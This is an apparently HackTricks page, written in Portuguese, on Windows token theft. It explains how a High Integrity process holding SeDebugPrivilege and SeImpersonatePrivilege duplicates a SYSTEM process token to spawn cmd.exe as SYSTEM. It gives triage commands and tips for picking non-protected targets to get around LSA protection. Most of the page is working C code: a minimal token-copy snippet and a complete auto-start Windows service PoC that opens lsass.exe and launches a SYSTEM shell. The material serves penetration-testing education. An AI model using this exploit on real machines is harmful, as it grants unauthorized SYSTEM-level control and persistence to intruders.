# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Esta página aborda a variante de **manual token-theft**, na qual um contexto de **High Integrity** que já possui **`SeDebugPrivilege`** e **`SeImpersonatePrivilege`** abre um processo **SYSTEM** adequado, **duplicates its token** e **spawns a new process** com esse token.

Se você só precisa de um shell **SYSTEM** rápido a partir de um processo de administrador privilegiado, consulte também:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Se você **não** possui um process-handle path, mas tem **`SeImpersonatePrivilege`**, a rota de **named-pipe / Potato** geralmente é mais fácil:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Triagem rápida

Antes de tentar o token-copy path, confirme que o processo atual já está em um contexto útil:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notas:

- **`SeDebugPrivilege`** é o que permite abrir muitos processos **SYSTEM não protegidos**, mesmo quando a DACL normalmente bloquearia o acesso.
- **`SeImpersonatePrivilege`** é o que torna **`CreateProcessWithTokenW`** prático posteriormente.
- Se o caminho de cópia do token fornecer apenas um token SYSTEM fraco ou filtrado, roube um token de um **processo SYSTEM diferente**.

## Escolha o processo-alvo com cuidado

A técnica geralmente é demonstrada contra o **`lsass.exe`**, mas, no Windows moderno, esse costuma ser o **alvo errado**:

- Se **LSA Protection / RunAsPPL** estiver habilitado, o **`lsass.exe`** estará protegido, e um processo de administrador comum com **`SeDebugPrivilege`** ainda não conseguirá abri-lo.<sup>[[2]](#references)</sup>
- Prefira processos SYSTEM **não PPL**, como **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** ou uma instância inicial do **`svchost.exe`**.
- **Processos protegidos** e alguns processos especiais, como **`System`** ou **`csrss.exe`**, não são alvos realistas em user-mode para esta técnica.
- Use o **Process Hacker / Process Explorer** em execução com privilégios elevados para verificar se o token do alvo realmente possui os privilégios desejados antes de duplicá-lo.

## Detalhes das APIs importantes na prática

Muitos PoCs públicos solicitam **`PROCESS_ALL_ACCESS`** e **`TOKEN_ALL_ACCESS`**, mas isso gera mais ruído do que o necessário. Na prática:

- Abra o processo-alvo apenas com os direitos necessários (normalmente **`PROCESS_QUERY_INFORMATION`** ou **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Abra o token com os direitos necessários para a criação do processo: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Use **`DuplicateTokenEx(..., TokenPrimary, ...)`** para criar um **token primário**; apenas um token de impersonation não é suficiente para criar um novo processo.
- Se **`CreateProcessWithTokenW`** falhar com **`1314`**, use **`CreateProcessAsUserW`**.
- Se você iniciar a partir de um **service / Session 0**, lembre-se de que **`CreateProcessWithTokenW`** mantém o processo filho na **sessão do chamador**. Se precisar de um shell de desktop visível, use **`CreateProcessAsUserW`** e mova o token para a sessão desejada.<sup>[[1]](#references)</sup>

Um fluxo moderno mínimo é:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## PoC de serviço completo

O código a seguir **explora os privilégios `SeDebugPrivilege` e `SeImpersonatePrivilege`** para copiar o token de um **processo executado como SYSTEM** e com **todos os privilégios do token**. Nesse caso, o código pode ser compilado e usado como um **binário de serviço do Windows** para verificar se o primitive funciona.<sup>[[3]](#references)</sup>

A parte principal do **código onde ocorre a elevação** está dentro da função **`Exploit`**. Dentro dessa função, você pode ver que o **`lsass.exe`** é procurado, seu **token é copiado** e, por fim, esse token é usado para iniciar um novo **`cmd.exe`** com todos os privilégios do token copiado.

Em hosts modernos, geralmente você vai querer substituir o **`lsass.exe`** por outro **processo SYSTEM que não seja PPL**, como **`winlogon.exe`**, **`wininit.exe`** ou **`services.exe`**.

Outros processos executados como SYSTEM com todos ou a maioria dos privilégios do token são: **`services.exe`**, **`svchost.exe`** (alguns dos primeiros), **`wininit.exe`**, **`csrss.exe`**... Lembre-se de que, normalmente, **você não conseguirá copiar um token de um processo protegido**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Referências

- [1] [função CreateProcessWithTokenW (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [Configurar proteção LSA adicional (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [3] [Executando meu programa como um serviço (cboard.cprogramming.com) – skeleton de serviço do Windows usado pelo PoC](https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html)

{{#include ../../banners/hacktricks-training.md}}
